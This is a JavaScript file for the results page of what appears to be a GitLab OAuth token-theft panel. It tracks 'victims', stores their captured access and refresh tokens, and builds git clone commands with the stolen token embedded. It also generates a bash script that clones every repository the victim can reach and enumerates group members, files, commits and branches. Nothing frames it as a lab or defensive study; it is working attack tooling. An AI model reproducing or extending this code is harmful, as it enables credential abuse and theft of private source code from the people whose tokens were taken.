/**
 * Enumeration Results Page JavaScript
 * Handles deep enumeration and UI interactions
 */

// Global state
let victimId = null;
let accessToken = null;
let refreshToken = null;

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    // Get data from page
    const dataEl = document.getElementById('page-data');
    if (dataEl) {
        victimId = parseInt(dataEl.dataset.victimId);
        accessToken = dataEl.dataset.accessToken || '';
        refreshToken = dataEl.dataset.refreshToken || '';
    }
});

// Toast notifications
function showToast(message, type) {
    const toast = document.createElement('div');
    toast.textContent = message;
    const bgColor = type === 'error' ? '#c5221f' : type === 'warning' ? '#fc6d26' : '#108548';
    toast.style.cssText = 'position: fixed; bottom: 20px; right: 20px; background: ' + bgColor + 
                          '; color: white; padding: 15px 25px; border-radius: 4px; z-index: 10000; ' +
                          'box-shadow: 0 4px 6px rgba(0,0,0,0.3); animation: slideIn 0.3s ease;';
    document.body.appendChild(toast);
    setTimeout(function() {
        toast.style.animation = 'slideOut 0.3s ease';
        setTimeout(function() { toast.remove(); }, 300);
    }, 3000);
}

// Copy to clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(function() {
        showToast('✓ Copied to clipboard!', 'success');
    }).catch(function(err) {
        console.error('Copy failed:', err);
        showToast('✗ Failed to copy', 'error');
    });
}

// Copy token
function copyToken() {
    if (accessToken) {
        copyToClipboard(accessToken);
    } else {
        showToast('No token available', 'error');
    }
}

// Copy refresh token
function copyRefreshToken() {
    if (refreshToken) {
        copyToClipboard(refreshToken);
    } else {
        showToast('No refresh token available', 'error');
    }
}

// Copy clone command with token
function copyCloneCmd(repoUrl) {
    let cmd = 'git clone ';
    if (accessToken && repoUrl.indexOf('https://') === 0) {
        cmd += repoUrl.replace('https://', 'https://oauth2:' + accessToken + '@');
    } else {
        cmd += repoUrl;
    }
    copyToClipboard(cmd);
}

// Generate clone script for all repos
function generateCloneScript() {
    const projects = window.ALL_PROJECTS || [];
    
    if (!projects || projects.length === 0) {
        showToast('No projects to clone', 'error');
        return;
    }

    let script = '#!/bin/bash\n';
    script += '# GitLab Repository Clone Script\n';
    script += '# Generated: ' + new Date().toISOString() + '\n';
    script += '# Victim ID: ' + victimId + '\n';
    script += '# Total projects: ' + projects.length + '\n';
    script += '#\n';
    script += '# This script will clone all accessible GitLab repositories\n';
    script += '# with authentication using the captured OAuth token.\n';
    script += '#\n\n';
    
    script += 'set -e  # Exit on error\n';
    script += 'set -u  # Exit on undefined variable\n\n';
    
    script += '# Colors for output\n';
    script += 'RED="\\033[0;31m"\n';
    script += 'GREEN="\\033[0;32m"\n';
    script += 'YELLOW="\\033[1;33m"\n';
    script += 'NC="\\033[0m"  # No Color\n\n';
    
    script += '# Counters\n';
    script += 'TOTAL=' + projects.length + '\n';
    script += 'SUCCESS=0\n';
    script += 'FAILED=0\n';
    script += 'SKIPPED=0\n\n';
    
    script += '# Create base directory\n';
    script += 'BASE_DIR="gitlab_repos_victim_' + victimId + '_$(date +%Y%m%d_%H%M%S)"\n';
    script += 'mkdir -p "$BASE_DIR"\n';
    script += 'cd "$BASE_DIR"\n\n';
    
    script += 'echo -e "${GREEN}========================================${NC}"\n';
    script += 'echo -e "${GREEN}GitLab Repository Clone Script${NC}"\n';
    script += 'echo -e "${GREEN}========================================${NC}"\n';
    script += 'echo -e "Victim ID: ' + victimId + '"\n';
    script += 'echo -e "Total repositories: $TOTAL"\n';
    script += 'echo -e "Target directory: $(pwd)"\n';
    script += 'echo -e "${GREEN}========================================${NC}"\n';
    script += 'echo ""\n\n';
    
    script += '# Function to clone a repository\n';
    script += 'clone_repo() {\n';
    script += '    local num=$1\n';
    script += '    local name=$2\n';
    script += '    local url=$3\n';
    script += '    local path=$4\n';
    script += '    \n';
    script += '    echo -e "${YELLOW}[$num/$TOTAL]${NC} Cloning: $name"\n';
    script += '    \n';
    script += '    # Create namespace directory if needed\n';
    script += '    if [ -n "$path" ]; then\n';
    script += '        local dir_path=$(dirname "$path")\n';
    script += '        if [ "$dir_path" != "." ]; then\n';
    script += '            mkdir -p "$dir_path"\n';
    script += '        fi\n';
    script += '    fi\n';
    script += '    \n';
    script += '    # Check if already cloned\n';
    script += '    if [ -d "$path" ]; then\n';
    script += '        echo -e "  ${YELLOW}⊘${NC} Already exists, skipping"\n';
    script += '        ((SKIPPED++))\n';
    script += '        return 0\n';
    script += '    fi\n';
    script += '    \n';
    script += '    # Clone the repository\n';
    script += '    if git clone --quiet "$url" "$path" 2>/dev/null; then\n';
    script += '        echo -e "  ${GREEN}✓${NC} Successfully cloned"\n';
    script += '        ((SUCCESS++))\n';
    script += '    else\n';
    script += '        echo -e "  ${RED}✗${NC} Failed to clone"\n';
    script += '        ((FAILED++))\n';
    script += '    fi\n';
    script += '    echo ""\n';
    script += '}\n\n';
    
    script += '# Clone all repositories\n';
    projects.forEach(function(project, index) {
        if (project.http_url_to_repo) {
            const num = index + 1;
            const name = (project.name || 'unknown').replace(/'/g, "'\\''");
            const path = (project.path_with_namespace || project.path || project.name || 'repo_' + num).replace(/'/g, "'\\''");
            
            let url = project.http_url_to_repo;
            if (accessToken && url.indexOf('https://') === 0) {
                url = url.replace('https://', 'https://oauth2:' + accessToken + '@');
            }
            url = url.replace(/'/g, "'\\''");
            
            script += 'clone_repo ' + num + ' \'' + name + '\' \'' + url + '\' \'' + path + '\'\n';
        }
    });
    
    script += '\n# Summary\n';
    script += 'echo -e "${GREEN}========================================${NC}"\n';
    script += 'echo -e "${GREEN}Clone Summary${NC}"\n';
    script += 'echo -e "${GREEN}========================================${NC}"\n';
    script += 'echo -e "Total repositories: $TOTAL"\n';
    script += 'echo -e "${GREEN}Successfully cloned: $SUCCESS${NC}"\n';
    script += 'if [ $SKIPPED -gt 0 ]; then\n';
    script += '    echo -e "${YELLOW}Skipped (already exists): $SKIPPED${NC}"\n';
    script += 'fi\n';
    script += 'if [ $FAILED -gt 0 ]; then\n';
    script += '    echo -e "${RED}Failed: $FAILED${NC}"\n';
    script += 'fi\n';
    script += 'echo -e "${GREEN}========================================${NC}"\n';
    script += 'echo ""\n';
    script += 'echo -e "All repositories cloned to: ${GREEN}$(pwd)${NC}"\n';
    script += '\n';
    script += '# Exit with error if any clones failed\n';
    script += 'if [ $FAILED -gt 0 ]; then\n';
    script += '    exit 1\n';
    script += 'fi\n';
    
    const blob = new Blob([script], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'clone_repos_victim_' + victimId + '.sh';
    a.click();
    URL.revokeObjectURL(url);
    
    showToast('✓ Clone script downloaded!', 'success');
}

// Enumerate group members
async function enumerateGroupMembers(groupDbId, groupName) {
    const membersDiv = document.getElementById('group-members-' + groupDbId);
    const contentDiv = document.getElementById('group-members-content-' + groupDbId);
    
    if (!membersDiv || !contentDiv) return;
    
    // Toggle visibility
    if (membersDiv.style.display === 'block') {
        membersDiv.style.display = 'none';
        return;
    }
    
    membersDiv.style.display = 'block';
    contentDiv.innerHTML = '<p style="color: #fc6d26;">🔄 Loading members...</p>';
    
    try {
        const response = await fetch('/api/groups/' + groupDbId + '/members?victim_id=' + victimId);
        const data = await response.json();
        
        if (!response.ok) {
            throw new Error(data.error || 'Failed to load members');
        }
        
        // Build HTML for members
        let html = '';
        
        if (data.members && data.members.length > 0) {
            html += '<div style="margin-top: 10px;">';
            html += '<table style="width: 100%; border-collapse: collapse;">';
            html += '<thead><tr style="background: #2d2d2d;">';
            html += '<th style="padding: 8px; text-align: left;">Username</th>';
            html += '<th style="padding: 8px; text-align: left;">Name</th>';
            html += '<th style="padding: 8px; text-align: left;">Access Level</th>';
            html += '</tr></thead>';
            html += '<tbody>';
            
            data.members.forEach(function(member) {
                html += '<tr style="border-bottom: 1px solid #404040;">';
                html += '<td style="padding: 8px;"><code>' + (member.username || 'N/A') + '</code></td>';
                html += '<td style="padding: 8px;">' + (member.name || 'N/A') + '</td>';
                html += '<td style="padding: 8px;">' + (member.access_level_name || member.access_level || 'N/A') + '</td>';
                html += '</tr>';
            });
            
            html += '</tbody></table>';
            html += '<p style="margin-top: 10px; color: #666; font-size: 0.9rem;">Total: ' + data.members.length + ' members</p>';
            html += '</div>';
        } else {
            html = '<p style="color: #666;">No members found or insufficient permissions</p>';
        }
        
        contentDiv.innerHTML = html;
        showToast('✓ Members loaded', 'success');
        
    } catch (error) {
        console.error('Error loading group members:', error);
        contentDiv.innerHTML = '<p style="color: #c5221f;">✗ Error: ' + error.message + '</p>';
        showToast('✗ Failed to load members', 'error');
    }
}

// Enumerate project deeper
async function enumerateProjectDeeper(projectId, projectName) {
    const deeperDiv = document.getElementById('deeper-' + projectId);
    const contentDiv = document.getElementById('deeper-content-' + projectId);
    
    if (!deeperDiv || !contentDiv) return;
    
    // Toggle visibility
    if (deeperDiv.style.display === 'block') {
        deeperDiv.style.display = 'none';
        return;
    }
    
    deeperDiv.style.display = 'block';
    contentDiv.innerHTML = '<p style="color: #fc6d26;">🔄 Enumerating...</p>';
    
    try {
        const response = await fetch('/api/projects/' + projectId + '/enumerate_deeper?victim_id=' + victimId);
        const data = await response.json();
        
        if (!response.ok) {
            throw new Error(data.error || 'Failed to enumerate');
        }
        
        // Build HTML for results
        let html = '';
        
        // Files
        if (data.files && data.files.length > 0) {
            html += '<h5>📁 Files (' + data.files.length + ')</h5>';
            html += '<ul style="max-height: 200px; overflow-y: auto; margin: 10px 0;">';
            data.files.slice(0, 50).forEach(function(file) {
                html += '<li style="font-family: monospace; font-size: 0.85rem;">' + 
                        (file.type === 'tree' ? '📁 ' : '📄 ') + file.path + '</li>';
            });
            if (data.files.length > 50) {
                html += '<li style="color: #666;">... and ' + (data.files.length - 50) + ' more files</li>';
            }
            html += '</ul>';
        }
        
        // Commits
        if (data.commits && data.commits.length > 0) {
            html += '<h5>📝 Recent Commits (' + data.commits.length + ')</h5>';
            html += '<ul style="margin: 10px 0;">';
            data.commits.forEach(function(commit) {
                html += '<li style="margin-bottom: 8px;">';
                html += '<code style="background: #2d2d2d; padding: 2px 6px; border-radius: 3px;">' + 
                        commit.short_id + '</code> ';
                html += '<span style="color: #999;">' + commit.title + '</span><br>';
                html += '<small style="color: #666;">by ' + commit.author_name + ' • ' + 
                        new Date(commit.created_at).toLocaleString() + '</small>';
                html += '</li>';
            });
            html += '</ul>';
        }
        
        // Branches
        if (data.branches && data.branches.length > 0) {
            html += '<h5>🌿 Branches (' + data.branches.length + ')</h5>';
            html += '<div style="display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0;">';
            data.branches.forEach(function(branch) {
                const style = branch.default ? 'background: #fc6d26;' : 'background: #404040;';
                html += '<span style="' + style + ' padding: 4px 10px; border-radius: 3px; font-size: 0.85rem;">' +
                        branch.name + (branch.default ? ' (default)' : '') + '</span>';
            });
            html += '</div>';
        }
        
        // Tags
        if (data.tags && data.tags.length > 0) {
            html += '<h5>🏷️ Tags (' + data.tags.length + ')</h5>';
            html += '<div style="display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0;">';
            data.tags.slice(0, 20).forEach(function(tag) {
                html += '<span style="background: #2d2d2d; padding: 4px 10px; border-radius: 3px; font-size: 0.85rem;">' +
                        tag.name + '</span>';
            });
            if (data.tags.length > 20) {
                html += '<span style="color: #666; padding: 4px 10px;">+' + (data.tags.length - 20) + ' more</span>';
            }
            html += '</div>';
        }
        
        if (html === '') {
            html = '<p style="color: #666;">No additional data found</p>';
        }
        
        contentDiv.innerHTML = html;
        showToast('✓ Enumeration complete', 'success');
        
    } catch (error) {
        console.error('Enumeration error:', error);
        contentDiv.innerHTML = '<p style="color: #c5221f;">✗ Error: ' + error.message + '</p>';
        showToast('✗ Enumeration failed', 'error');
    }
}

// Add CSS animations
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(400px); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(400px); opacity: 0; }
    }
`;
document.head.appendChild(style);
